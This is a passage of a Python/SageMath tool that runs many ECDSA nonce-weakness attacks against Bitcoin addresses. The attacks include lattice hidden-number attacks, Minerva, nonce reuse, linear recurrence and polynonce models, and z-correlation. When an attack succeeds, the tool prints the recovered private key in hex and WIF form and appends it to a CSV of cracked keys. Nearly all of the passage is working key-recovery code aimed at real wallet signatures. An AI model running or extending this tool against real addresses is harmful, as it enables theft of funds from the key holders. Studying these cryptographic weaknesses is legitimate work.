        val = (U[i+1] * shift_H) % N
        M[row_H0, i] = (val * S_L) % (N * S_L)
    M[row_H0, 2 * num - 1] = 1 * S_H

    # 5. Row for Constant
    row_C = 2 * num
    for i in range(num - 1):
        val = K[i+1]
        if val > N // 2: val -= N
        M[row_C, i] = val * S_L
    M[row_C, 2 * num] = W_1

    M_r = progressive_reduce(M) if progressive else M.LLL()

    # Extract
    for row in M_r:
        if row[2 * num] == 0: continue
        sign = 1 if row[2 * num] > 0 else -1

        dL0_val = int(row[num - 1]) * sign
        dH0_val = int(row[2 * num - 1]) * sign

        dL0 = exact_div(dL0_val, S_L)
        dH0 = exact_div(dH0_val, S_H)

        L0 = dL0 + mu_L
        H0 = dH0 + mu_H

        # d = (L_0 + H_0 2^136 - A_0) * T_0^-1 mod N
        d_cand = ((L0 + H0 * shift_H - A[0]) * T0_inv) % N
        if verify_key_fast(pub, d_cand):
            return d_cand

    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 10: LINEAR NONCE BIAS
# ██████████████████████████████████████████████████████████████████████████████
def solve_linear_nonce(pub, sigs, bias_bits, progressive=False):
    """Linear nonce bias: nonces have bias_bits of bias (small deviation from some base).
    Uses differential HNP: k_i - k_0 is small (bounded by 2^bias_bits)."""
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 3:
        return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1
    W = 2 ** (256 - bias_bits)
    dim = m + 2
    M = Matrix(ZZ, dim, dim)

    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = ((ri * si_inv) - (r0 * s0_inv)) % N
        a_i = ((zi * si_inv) - (z0 * s0_inv)) % N
        M[i, i] = N * W
        M[m, i] = t_i * W
        M[m + 1, i] = a_i * W
    M[m, m] = 1
    M[m + 1, m + 1] = N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, 1, pub)


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 11: SHARED LSB NONCE (FIXED SUFFIX)
def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
    sigs = sigs[:MAX_SIGS]
    num = len(sigs)
    if num < 3:
        return None
    r0 = int(sigs[0]['r'], 16)
    s0 = int(sigs[0]['s'], 16)
    z0 = int(sigs[0]['z'], 16)
    s0_inv = int(inverse_mod(s0, N))
    m = num - 1

    W = 2 ** shared_bits
    shift_inv = int(inverse_mod(2 ** shared_bits, N))
    dim = m + 2
    M = Matrix(ZZ, dim, dim)
    for i in range(m):
        ri = int(sigs[i + 1]['r'], 16)
        si = int(sigs[i + 1]['s'], 16)
        zi = int(sigs[i + 1]['z'], 16)
        si_inv = int(inverse_mod(si, N))
        t_i = (((ri * si_inv) - (r0 * s0_inv)) * shift_inv) % N
        a_i = (((zi * si_inv) - (z0 * s0_inv)) * shift_inv) % N
        M[i, i] = N * W
        M[m, i] = t_i * W
        M[m + 1, i] = a_i * W
    M[m, m] = 1
    M[m + 1, m + 1] = N
    M_r = progressive_reduce(M) if progressive else M.LLL()
    return extract_key(M_r, m, 1, pub)



def solve_kannan_embedding(pub, sigs, leaked_bits, progressive=False):
    """True Kannan embedding: converts CVP to SVP by appending the target vector.
    Since build_msb_lattice is now an optimal embedded SVP, we just use it directly."""
    sigs = sigs[:MAX_SIGS]
    M, scale, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M) if progressive else M.LLL()
    d = extract_key(M_r, key_col, scale, pub)
    if d:
        return d
    return extract_key_extended(M_r, key_col, scale, pub)


def solve_progressive_msb(pub, sigs, leaked_bits):
    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M)
    d = extract_key(M_r, key_col, B, pub)
    if d:
        return d
    return extract_key_extended(M_r, key_col, B, pub)

def solve_progressive_lsb(pub, sigs, leaked_bits):
    M, B, key_col = build_lsb_lattice(sigs, leaked_bits)
    M_r = progressive_reduce(M)
    d = extract_key(M_r, key_col, B, pub)
    if d:
        return d
    return extract_key_extended(M_r, key_col, B, pub)




# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 13: MINERVA VARIABLE-BITLENGTH HNP
# ██████████████████████████████████████████████████████████████████████████████
def solve_minerva_variable(pub, sigs, sig_data=None):
    """Minerva-style HNP: per-signature scaling based on actual r/s bit-length.
    Unlike standard HNP which uses uniform leaked_bits for all sigs, this uses
    the measured bit-length of each r_i/s_i as individual leak estimates.
    Much more powerful when signatures have varying bias levels."""
    n = min(len(sigs), 50)
    sigs = sigs[:n]
    if n < 5:
        return None

    # Measure per-signature leak from r and s bit-lengths
    leak_info = []
    for i, sig in enumerate(sigs):
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        r_leak = max(0, 256 - r.bit_length())
        s_leak = max(0, 256 - s.bit_length())
        leak = max(r_leak, s_leak)
        if leak > 0:
            leak_info.append((leak, i))

    if len(leak_info) < 4:
        return None

    # Sort by leak (most leak first), select best
    leak_info.sort(reverse=True)
    use_n = min(len(leak_info), 40)
    total_leak = sum(l for l, _ in leak_info[:use_n])
    if total_leak < 260:
        return None

    sel_idx = [idx for _, idx in leak_info[:use_n]]
    sel_leaks = [leak for leak, _ in leak_info[:use_n]]
    sel_sigs = [sigs[i] for i in sel_idx]

    # Build lattice with per-signature W_i scaling
    dim = use_n + 2
    M = Matrix(ZZ, dim, dim)

    for i in range(use_n):
        if sig_data and sel_idx[i] < len(sig_data):
            t_i = sig_data[sel_idx[i]]['t']
            a_i = sig_data[sel_idx[i]]['a']
        else:
            r_i = int(sel_sigs[i]['r'], 16)
            s_i = int(sel_sigs[i]['s'], 16)
            z_i = int(sel_sigs[i]['z'], 16)
            s_inv = int(inverse_mod(s_i, N))
            t_i = (r_i * s_inv) % N
            a_i = (z_i * s_inv) % N

        W_i = 2 ** sel_leaks[i]
        mu_i = N // (2 * W_i)
        M[i, i] = N * W_i
        M[use_n, i] = t_i * W_i
        M[use_n + 1, i] = (a_i - mu_i) * W_i

    M[use_n, use_n] = 1
    M[use_n + 1, use_n + 1] = N

    M_r = M.LLL()
    d = extract_key(M_r, use_n, 1, pub)
    if d:
        return d
    d = extract_key_extended(M_r, use_n, 1, pub)
    if d:
        return d

    # Try BKZ-15 refinement
    try:
        M_r2 = M_r.BKZ(block_size=min(15, use_n))
        d = extract_key(M_r2, use_n, 1, pub)
        if d:
            return d
        return extract_key_extended(M_r2, use_n, 1, pub)
    except Exception:
        pass
    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 14: Z-CORRELATION NONCE DETECTION
# ██████████████████████████████████████████████████████████████████████████████
def solve_z_correlation(pub, sigs):
    """Detect if nonces are derived from z via simple functions.
    Tests: k=z, k=z>>s, k=z*c, k=z+c, k=N-z, k=byte_reverse(z), k=z^mask.
    No lattice — pure algebraic verification. Near-instant."""
    if len(sigs) < 2:
        return None
    t0 = time.time()

    parsed = []
    for sig in sigs[:30]:
        r = int(sig['r'], 16)
        s = int(sig['s'], 16)
        z = int(sig['z'], 16)
        s_inv = int(inverse_mod(s, N))
        t = (r * s_inv) % N
        a = (z * s_inv) % N
        t_inv = int(inverse_mod(int(t), N))
        parsed.append((r, s, z, t, a, t_inv))

    def try_k(k_val, idx=0):
        """Derive d from candidate k at sig[idx], verify against pubkey."""
        k_val = int(k_val) % N
        if k_val == 0:
            return None
        _, _, _, t, a, t_inv = parsed[idx]
        d_cand = ((k_val - a) * t_inv) % N
        if d_cand != 0 and d_cand < N and verify_key_fast(pub, d_cand):
            return d_cand
        return None

    z0 = parsed[0][2]

    # k = z (identity)
    d = try_k(z0)
    if d: return d

    # k = N - z (negation)
    d = try_k(N - z0)
    if d: return d

    # k = z >> shift
    for shift in range(1, 33):
        d = try_k(z0 >> shift)
        if d: return d

    # k = z * small_c  or  k = z * inv(small_c)
    for c in range(2, 65):
        if time.time() - t0 > 30:
            return None
        d = try_k((z0 * c) % N)
        if d: return d
        d = try_k((z0 * int(inverse_mod(c, N))) % N)
        if d: return d

    # k = z + small_c
    for c in range(-128, 129):
        if c == 0: continue
        d = try_k((z0 + c) % N)
        if d: return d

    # k = z XOR small_mask
    for mask in range(1, 512):
        d = try_k(z0 ^ mask)
        if d: return d

    # k = byte_reverse(z)
    z_bytes = z0.to_bytes(32, 'big')
    d = try_k(int.from_bytes(z_bytes[::-1], 'big'))
    if d: return d

    # k = z with pairs of bytes swapped
    zb = list(z_bytes)
    for i in range(0, 32, 2):
        zb[i], zb[i+1] = zb[i+1], zb[i]
    d = try_k(int.from_bytes(bytes(zb), 'big'))
    if d: return d

    # Try same models on second sig (different z may reveal pattern)
    if len(parsed) >= 2:
        z1 = parsed[1][2]
        for shift in range(1, 17):
            d = try_k(z1 >> shift, 1)
            if d: return d
        for c in range(2, 33):
            d = try_k((z1 * c) % N, 1)
            if d: return d

    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 15: GENERALIZED LINEAR RECURRENCE DETECTION [FIXED v5.0]
# ██████████████████████████████████████████████████████████████████████████████
def solve_linear_recurrence(pub, sigs, precomputed_uv=None):
    """Detect if nonces follow a linear recurrence of order 1-4:
      Order 1 (LCG):  k_{i+1} = a*k_i + b
      Order 2 (LFSR): k_i = c1*k_{i-1} + c2*k_{i-2} + c3
      Order 3/4: higher-order LFSR patterns.

    v5.0 FIX: Proper algebraic elimination for order-2 recurrence.
    Uses the relation k_i = u_i*d + v_i and eliminates recurrence coefficients
    by forming a determinant condition that is linear in d."""
    n = len(sigs)
    if n < 5:
        return None
    t0 = time.time()

    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)

    # ─── Order 1 (LCG): k_{i+1} = a*k_i + b ───
    # Elimination: (k2 - k1)(k1 - k0) - (k1 - k0)(k2 - k1) crossed gives:
    # (k2 - k1)^2 - (k3 - k2)(k1 - k0) = 0
    # Substituting k_i = u_i*d + v_i and expanding gives quadratic in d.
    # This is already handled by solve_lcg_phantom, but we do a lattice version here.

    # ─── Order 2: k_i = c1*k_{i-1} + c2*k_{i-2} ───
    # Using 5 consecutive sigs (indices 0..4), we have:
    #   k_2 = c1*k_1 + c2*k_0  ... (I)
    #   k_3 = c1*k_2 + c2*k_1  ... (II)
    #   k_4 = c1*k_3 + c2*k_2  ... (III)
    # Eliminating c1, c2 from (I),(II),(III):
    #   det | k_2, k_1, k_0 |
    #       | k_3, k_2, k_1 | = 0
    #       | k_4, k_3, k_2 |
    # Substituting k_i = u_i*d + v_i gives a cubic in d, but the leading
    # coefficient often vanishes, leaving a quadratic or linear equation.

    for start in range(min(n - 4, 40)):
        if time.time() - t0 > ATTACK_TIMEOUT:
            return None
        try:
            # Get u,v for 5 consecutive sigs
            u = [uv[start + i][0] for i in range(5)]
            v = [uv[start + i][1] for i in range(5)]

            # Order-2 determinant condition (no constant term):
            # | k_2  k_1  k_0 |
            # | k_3  k_2  k_1 | = 0
            # | k_4  k_3  k_2 |
            # With k_i = u_i * d + v_i, expand the 3x3 determinant as polynomial in d
            # det = A*d^3 + B*d^2 + C*d + D = 0

            # Compute coefficients using Sarrus rule expansion
            # Row 0: (u2*d+v2, u1*d+v1, u0*d+v0)
            # Row 1: (u3*d+v3, u2*d+v2, u1*d+v1)
            # Row 2: (u4*d+v4, u3*d+v3, u2*d+v2)

            # For efficiency, work in Z/NZ and try to solve
            Zn = Zmod(N)

            # Build the 3x3 matrix symbolically over Z/NZ[d]
            # Instead of expanding symbolically, evaluate at trial points
            # and use the nullspace approach

            # Alternative: Direct elimination approach
            # From (I): c1 = (k_2 - c2*k_0) / k_1
            # Sub into (II): k_3 = (k_2 - c2*k_0)*k_2/k_1 + c2*k_1
            # => k_3*k_1 = k_2^2 - c2*k_0*k_2 + c2*k_1^2
            # => c2 = (k_3*k_1 - k_2^2) / (k_1^2 - k_0*k_2)

            # Similarly from (II),(III):
            # c2 = (k_4*k_2 - k_3^2) / (k_2^2 - k_1*k_3)

            # Setting them equal:
            # (k_3*k_1 - k_2^2)(k_2^2 - k_1*k_3) = (k_4*k_2 - k_3^2)(k_1^2 - k_0*k_2)

            # Substitute k_i = u_i*d + v_i, expand, collect by powers of d
            # This is a degree-4 polynomial. Try to solve it.

            # For practical efficiency: compute the determinant condition numerically
            # by testing if the 3x3 Hankel matrix is singular for candidate d values
            # extracted from a small lattice

            # Lattice approach: build (m+1)-dim lattice from u-differences
            m = 4  # use 4 consecutive differences
            dim = m + 1
            L = Matrix(ZZ, dim, dim)

            for i in range(m):
                i1 = start + i
                i2 = start + i + 1
                du = (uv[i2][0] - uv[i1][0]) % N
                L[i, i] = N
                L[m, i] = du

            L[m, m] = 1
            L_r = L.LLL()

            for row in L_r:
                val = int(row[m])
                if val == 0:
                    continue
                for sign in [1, -1]:
                    d_cand = (sign * val) % N
                    if d_cand != 0 and verify_key_fast(pub, d_cand):
                        return d_cand

            # ─── Algebraic elimination for order-2 [v5.0 FIX] ───
            # Compute the determinant condition directly
            # det(Hankel) = k2*(k2*k2 - k1*k3) - k1*(k2*k3 - k1*k4) + k0*(k3*k3 - k2*k4)
            # = k2^3 - 2*k1*k2*k3 + k1^2*k4 + k0*k3^2 - k0*k2*k4
            # Substitute k_i = u_i*d + v_i, get poly in d, solve roots mod N

            # Use Sage's polynomial ring for clean computation
            R = PolynomialRing(Zn, 'd_var')
            d_var = R.gen()

            k_poly = [Zn(u[i]) * d_var + Zn(v[i]) for i in range(5)]

            # Determinant of Hankel matrix
            det_poly = (k_poly[2] * (k_poly[2] * k_poly[2] - k_poly[1] * k_poly[3])
                       - k_poly[1] * (k_poly[2] * k_poly[3] - k_poly[1] * k_poly[4])
                       + k_poly[0] * (k_poly[3] * k_poly[3] - k_poly[2] * k_poly[4]))

            # Find roots
            if det_poly == 0:
                continue
            roots = det_poly.roots(multiplicities=False)
            for root in roots:
                d_cand = int(root) % N
                if d_cand != 0 and verify_key_fast(pub, d_cand):
                    return d_cand

        except Exception:
            continue

    # ─── Order 3/4: Use larger lattice on differences ───
    for order in [3, 4]:
        needed = order + 3
        if n < needed:
            continue
        for start in range(min(n - needed, 20)):
            if time.time() - t0 > ATTACK_TIMEOUT:
                return None
            try:
                m = order + 2
                dim = m + 1
                L = Matrix(ZZ, dim, dim)

                for i in range(m):
                    i1 = start + i
                    i2 = start + i + 1
                    if i2 >= n:
                        break
                    du = (uv[i2][0] - uv[i1][0]) % N
                    L[i, i] = N
                    L[m, i] = du

                L[m, m] = 1
                L_r = L.LLL()

                for row in L_r:
                    val = int(row[m])
                    if val == 0:
                        continue
                    for sign in [1, -1]:
                        d_cand = (sign * val) % N
                        if d_cand != 0 and verify_key_fast(pub, d_cand):
                            return d_cand
            except Exception:
                continue

    return None


# ██████████████████████████████████████████████████████████████████████████████
# ATTACK 16: EXTENDED POLYNONCE MODELS (k=a*r+b, k=a*z²+b*z+c)
# ██████████████████████████████████████████████████████████████████████████████
def solve_polynonce_r_linear(pub, sigs):
    """Algebraic solve for k_i = a*r_i + b (mod N).
    Eliminates a,b using 3 sigs to get d directly."""
    n = len(sigs)
    if n < 3:
        return None
    t0 = time.time()

    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]

    def try_triple(i, j, k):
        r0, s0, z0 = parsed[i]
        r1, s1, z1 = parsed[j]
        r2, s2, z2 = parsed[k]
        # From k_m = a*r_m + b and s_m*k_m = z_m + r_m*d:
        # Eliminate a,b between pairs (0,1) and (0,2):
        A01 = (s0*r0*s1 - s1*r1*s0) % N
        C01 = (z0*s1 - z1*s0) % N
        D01 = (r0*s1 - r1*s0) % N
        A02 = (s0*r0*s2 - s2*r2*s0) % N
        C02 = (z0*s2 - z2*s0) % N
        D02 = (r0*s2 - r2*s0) % N
        det = (A02*D01 - A01*D02) % N
        if det == 0:
            return None
        try:
            det_inv = int(inverse_mod(int(det), N))
        except Exception:
            return None
        d_cand = ((A01*C02 - A02*C01) * det_inv) % N
        if d_cand != 0 and verify_key_fast(pub, d_cand):
            return d_cand
        return None

    for i in range(min(n - 2, 60)):
        if time.time() - t0 > ATTACK_TIMEOUT:
            return None
        d = try_triple(i, i + 1, i + 2)
        if d:
            return d

    attempts = 0
    for i in range(min(n, 10)):
        for j in range(i + 2, min(n, 20)):
            for k in range(j + 2, min(n, 30)):
                d = try_triple(i, j, k)
                if d:
                    return d
                attempts += 1
                if attempts >= 200:
                    return None
    return None


def solve_polynonce_quadratic(pub, sigs):
    """Solve for k_i = a*z_i^2 + b*z_i + c (mod N) — quadratic polynonce.
    4 unknowns (a,b,c,d), solved with 4 sigs via linear system over Z/NZ."""
    n = len(sigs)
    if n < 4:
        return None
    t0 = time.time()

    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]

    for start in range(min(n - 3, 40)):
        if time.time() - t0 > ATTACK_TIMEOUT:
            return None
        try:
            Zn = Zmod(N)
            A_mat = Matrix(Zn, 4, 4)
            rhs = vector(Zn, 4)
            for row, idx in enumerate(range(start, start + 4)):
                ri, si, zi = parsed[idx]
                # s_i*(a*z_i^2 + b*z_i + c) = z_i + r_i*d
                # => a*s_i*z_i^2 + b*s_i*z_i + c*s_i - r_i*d = z_i
                A_mat[row, 0] = Zn(si) * Zn(zi) * Zn(zi)
                A_mat[row, 1] = Zn(si) * Zn(zi)
                A_mat[row, 2] = Zn(si)
                A_mat[row, 3] = Zn(-ri)
                rhs[row] = Zn(zi)
            sol = A_mat.solve_right(rhs)
            d_cand = int(sol[3]) % N
            if d_cand != 0 and verify_key_fast(pub, d_cand):
                return d_cand
        except Exception:
            continue
    return None


# ==============================================================================
# TIMED ATTACK WRAPPER
# ==============================================================================
def run_attack(name, func, *args, timeout=ATTACK_TIMEOUT):
    """Run a single attack with timing and error handling.
    Returns (result, elapsed_seconds, error_msg_or_None)."""
    t0 = time.time()
    try:
        result = func(*args)
        elapsed = time.time() - t0
        return result, elapsed, None
    except AttackTimeout as e:
        elapsed = time.time() - t0
        return None, elapsed, f"{name}: TIMEOUT ({elapsed:.1f}s)"
    except Exception as e:
        elapsed = time.time() - t0
        err_msg = f"{name}: {type(e).__name__}: {e}"
        logger.warning(err_msg)
        return None, elapsed, err_msg



def worker_run_attack(task):
    func_name, label, args = task
    func = globals()[func_name]
    d, elapsed, err = run_attack(label, func, *args)
    return label, d, err, elapsed

# ==============================================================================
# PER-TARGET WORKER — runs all 18 attacks on one target
# ==============================================================================
def process_target(tgt, num_workers=1):
    """Worker function: runs all 18 attacks on a single target dict.
    Returns a dict with results, or None if nothing found."""
    global _attack_stats
    address = tgt.get('address', 'Unknown')
    pub = tgt.get('pubkey', 'Unknown')
    sigs = list(tgt.get('signatures', []))

    # Filter out malformed signatures BEFORE doing anything else
    sigs = validate_sigs(sigs)

    if len(sigs) < 2:
        return None

    # Normalize s values (Bitcoin low-s rule) — must happen before scoring
    sigs = normalize_s(sigs)

    # Save chronological/unfiltered signatures for sequential attacks
    raw_sigs = list(sigs)

    # Smart signature selection: when >MAX_SIGS, pick the BEST ones
    if len(sigs) > MAX_SIGS:
        scored = []
        for idx, sig in enumerate(sigs):
            r = int(sig['r'], 16)
            s = int(sig['s'], 16)
            score = 0
            r_bits = r.bit_length()
            if r_bits < 256:
                score += (256 - r_bits) * 4
            r_hex = hex(r)[2:].zfill(64)
            leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
            score += leading_zeros * 12
            s_bits = s.bit_length()
            if s_bits < 256:
                score += (256 - s_bits) * 2
            s_inv = int(inverse_mod(s, N))
            t = (r * s_inv) % N
            if t < N // 256 or t > N - N // 256:
                score += 40
            if t < N // 65536 or t > N - N // 65536:
                score += 60
            scored.append((score, idx))
        scored.sort(reverse=True)
        best_indices = sorted([idx for _, idx in scored[:MAX_SIGS]])
        sigs = [sigs[i] for i in best_indices]
        if not QUIET:
            print(f"[*] Selected best {MAX_SIGS} of {len(scored)} signatures (top weakness score)", flush=True)

    if not QUIET:
        print(f"\n{'=' * 70}", flush=True)
        print(f"[*] Target: {address}", flush=True)
        print(f"[*] Pubkey: {pub[:20]}...  |  Signatures: {len(sigs)}", flush=True)

    target_t0 = time.time()
    target_deadline = target_t0 + 720  # 12 minutes max per target
    result = None

    # Precompute once — shared across all attacks
    precomputed_uv_list = precompute_uv(raw_sigs)
    sig_data = precompute_sig_data(sigs)

    current_tasks = []

    def queue_attack(label, func, *args):
        current_tasks.append((func.__name__, label, args))

    def flush_phase(phase_name):
        nonlocal result
        if result is not None or not current_tasks:
            current_tasks.clear()
            return
        if not QUIET:
            print(f"\n[{phase_name}]...", flush=True)
        if time.time() > target_deadline:
            if not QUIET:
                print("  -> SKIPPED (deadline)", flush=True)
            current_tasks.clear()
            return

        if num_workers <= 1:
            for task in current_tasks:
                func_name, label, args = task
                if time.time() > target_deadline:
                    if not QUIET:
                        print(f"  -> {label}... SKIPPED (deadline)", flush=True)
                    continue
                func = globals()[func_name]
                d, elapsed, err = run_attack(label, func, *args)
                _attack_stats.append((label, elapsed, d is not None))
                if err:
                    if VERBOSE:
                        print(f"  -> {label}... ERROR ({elapsed:.1f}s) {err}", flush=True)
                    elif not QUIET:
                        print(f"  -> {label}... ERROR ({elapsed:.1f}s)", flush=True)
                elif d:
                    print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
                    result = {"address": address, "pub": pub, "priv": hex(d),
                              "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
                              "bug": label}
                    break
                else:
                    if not QUIET:
                        print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
        else:
            with Pool(processes=num_workers) as pool:
                for label, d, err, elapsed in pool.imap_unordered(worker_run_attack, current_tasks):
                    _attack_stats.append((label, elapsed, d is not None))
                    if err:
                        if VERBOSE:
                            print(f"  -> {label}... ERROR ({elapsed:.1f}s) {err}", flush=True)
                        elif not QUIET:
                            print(f"  -> {label}... ERROR ({elapsed:.1f}s)", flush=True)
                    elif d:
                        print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
                        result = {"address": address, "pub": pub, "priv": hex(d),
                                  "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
                                  "bug": label}
                        pool.terminate()
                        break
                    else:
                        if not QUIET:
                            print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
        current_tasks.clear()

    # ════════════════ PHASE 0: INSTANT ════════════════════════════════
    # Attack 0: Nonce Reuse (always run first — most basic vulnerability)
    if len(raw_sigs) >= 2:
        queue_attack(f"Nonce Reuse ({len(raw_sigs)} sigs)", solve_nonce_reuse, pub, raw_sigs)

    if SKIP_GCD:
        if not QUIET:
            print(f"  -> GCD Small-Delta... SKIPPED (-gcd flag)", flush=True)
            print(f"  -> LCG Phantom... SKIPPED (-gcd flag)", flush=True)
    else:
        queue_attack(f"GCD Small-Delta ({len(raw_sigs)} sigs)", solve_gcd_nonce, pub, raw_sigs, 100, precomputed_uv_list)
        queue_attack(f"LCG Phantom ({len(raw_sigs)} sigs)", solve_lcg_phantom, pub, raw_sigs, precomputed_uv_list)

    flush_phase("PHASE 0: Instant Attacks (No Lattice)")

    # ════════════════ PHASE 0.5: NOVEL INSTANT ═════════════════════════
    if result is None:
        # Z-Correlation (no lattice — tries k=f(z) for many simple f)
        queue_attack(f"Z-Correlation ({min(len(raw_sigs), 30)} sigs)", solve_z_correlation, pub, raw_sigs)

        # Extended Polynonce: k=a*r+b (different from existing k=a*z+b)
        if len(raw_sigs) >= 3:
            queue_attack(f"Polynonce R-Linear ({len(raw_sigs)} sigs)", solve_polynonce_r_linear, pub, raw_sigs)

        # Quadratic Polynonce: k=a*z²+b*z+c
        if len(raw_sigs) >= 4:
            queue_attack(f"Polynonce Quadratic ({len(raw_sigs)} sigs)", solve_polynonce_quadratic, pub, raw_sigs)

        # Generalized Linear Recurrence (v5.0 fixed algebraic elimination)
        if len(raw_sigs) >= 5:
            queue_attack(f"Linear Recurrence Order2-4 ({len(raw_sigs)} sigs)", solve_linear_recurrence, pub, raw_sigs, precomputed_uv_list)

        flush_phase("PHASE 0.5: Novel Instant Attacks")

    # ════════════════ PHASE 1: FAST ═══════════════════════════════════
    if result is None:
        # Algebraic Polynonce (instant — no lattice, direct algebra for k=a*z+b)
        if len(raw_sigs) >= 3:
            queue_attack(f"Polynonce Algebraic ({len(raw_sigs)} sigs)", solve_polynonce_algebraic, pub, raw_sigs)

        for bits in [32, 16, 8, 6]:
            if result is not None:
                break
            req = min_sigs_lll(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            queue_attack(f"Babai MSB {bits}-bit ({use} sigs)", solve_babai_msb, pub, sigs[:use], bits, sig_data[:use])
            queue_attack(f"Babai LSB {bits}-bit ({use} sigs)", solve_babai_lsb, pub, sigs[:use], bits, sig_data[:use])

    # Polynonce (Dario Clavijo Differential)
    if result is None and len(raw_sigs) >= 4:
        poly_configs = [
            (249, 79), (200, 50), (128, 30), (64, 15)
        ]
        for bb, req in poly_configs:
            if result is not None:
                break
            if len(raw_sigs) < req:
                continue
            queue_attack(f"Polynonce {bb}-bit ({req} sigs)", solve_polynonce, pub, raw_sigs[:req], bb)

    # SLA — adaptive iterations, 30s time budget
    if result is None and len(sigs) >= 15:
        nsigs = len(sigs)
        sla_configs = [
            (32, min(nsigs, 15), min(30, max(6, nsigs))),
            (16, min(nsigs, 26), min(20, max(5, nsigs // 2))),
        ]
        for bits, ss, iters in sla_configs:
            if result is not None:
                break
            if nsigs < ss:
                continue
            queue_attack(f"SLA {bits}-bit ({iters}x{ss})", solve_sla, pub, sigs, bits, iters, ss, 30)

    # Filtered Lattice
    if result is None and len(sigs) >= 5:
        for bits in [16, 8]:
            if result is not None:
                break
            queue_attack(f"Filtered Lattice {bits}-bit ({len(sigs)} sigs)", solve_filtered_lattice, pub, sigs, bits)

    # Minerva Variable-Bitlength HNP (per-signature leak scaling)
    if result is None and len(sigs) >= 5:
        queue_attack(f"Minerva Variable-BL ({len(sigs)} sigs)", solve_minerva_variable, pub, sigs, sig_data)

    if result is None:
        flush_phase("PHASE 1: Fast (Polynonce + Babai CVP + SLA + Minerva)")

    # ════════════════ PHASE 2: STANDARD HNP ═══════════════════════════
    if result is None:
        for w, s in [(32, 112), (32, 96), (16, 120)]:
            if result is not None:
                break
            req = min_sigs_lll(w)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            queue_attack(f"Middle-Bit w{w}@{s} ({use} sigs)", solve_middle_bits, pub, sigs[:use], w, s)

    if result is None:
        for bias, req_s in [(64, 20), (48, 15), (32, 18)]:
            if result is not None:
                break
            if len(raw_sigs) < req_s:
                continue
            queue_attack(f"Linear Bias {bias}-bit ({req_s} sigs)", solve_linear_nonce, pub, raw_sigs[:req_s], bias)

    if result is None:
        for shared, req_s in [(32, 15), (64, 10)]:
            if result is not None:
                break
            if len(sigs) < req_s:
                continue
            queue_attack(f"Shared LSB {shared}-bit ({req_s} sigs)", solve_shared_lsb, pub, sigs[:req_s], shared)

    if result is None:
        flush_phase("PHASE 2: Standard HNP Attacks")

    # ════════════════ PHASE 3: DEEP REDUCTION ═════════════════════════
    if result is None:
        for bits in [8, 6]:
            if result is not None:
                break
            req = min_sigs_bkz(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            queue_attack(f"Kannan Embedding {bits}-bit ({use} sigs)", solve_kannan_embedding, pub, sigs[:use], bits, True)

    if result is None:
        for bits in [8, 6]:
            if result is not None:
                break
            req = min_sigs_bkz(bits)
            if len(sigs) < req:
                continue
            use = min(len(sigs), req + 4)
            queue_attack(f"Progressive-BKZ MSB {bits}-bit ({use} sigs)", solve_progressive_msb, pub, sigs[:use], bits)
            queue_attack(f"Progressive-BKZ LSB {bits}-bit ({use} sigs)", solve_progressive_lsb, pub, sigs[:use], bits)

    if result is None:
        flush_phase("PHASE 3: Deep Reduction (Kannan + BKZ)")

    # ════════════════ RESULT ═══════════════════════════════════════════
    total_elapsed = time.time() - target_t0
    if result:
        print(f"\n{'!' * 70}", flush=True)
        print(f"   [SUCCESS] CRACKED in {total_elapsed:.1f}s!", flush=True)
        print(f"   METHOD:  {result['bug']}", flush=True)
        print(f"   ADDRESS: {address}", flush=True)
        print(f"   KEY:     {result['priv']}", flush=True)
        print(f"   WIF:     {result.get('priv_wif', 'N/A')}", flush=True)
        print(f"{'!' * 70}", flush=True)

        out_csv = os.path.join(_SCRIPT_DIR, "ADVANCED_RECOVERED_KEYS.csv")
        file_exists = os.path.isfile(out_csv)
        try:
            with open(out_csv, "a", newline="") as f:
                w = csv.writer(f)
                if not file_exists:
                    w.writerow(["Address", "Public Key", "Private Key Hex", "Private Key WIF", "Attack Method"])
                w.writerow([result['address'], result['pub'], result['priv'], result.get('priv_wif', ''), result['bug']])
            print(f"   [+] Appended to ADVANCED_RECOVERED_KEYS.csv", flush=True)
        except Exception as e:
            print(f"   [-] FAILED to append to CSV: {e}", flush=True)
    else:
        if not QUIET:
            print(f"\n   [FAILED] All 18 attacks exhausted ({total_elapsed:.1f}s).", flush=True)

    # Move JSON from pass -> processed (both success and failure)
    src = tgt.get('_source_file', '')
    if src and os.path.isfile(src):
        processed_dir = os.path.join(_SCRIPT_DIR, "reports", "processed")
        os.makedirs(processed_dir, exist_ok=True)
        dst = os.path.join(processed_dir, os.path.basename(src))
        try:
            shutil.move(src, dst)
            if not QUIET:
                print(f"   -> Moved to {dst}", flush=True)
        except Exception as e:
            if not QUIET:
                print(f"   -> Failed to move: {e}", flush=True)

    return {
        "result": result,
        "address": address,
        "source_file": tgt.get('_source_file', ''),
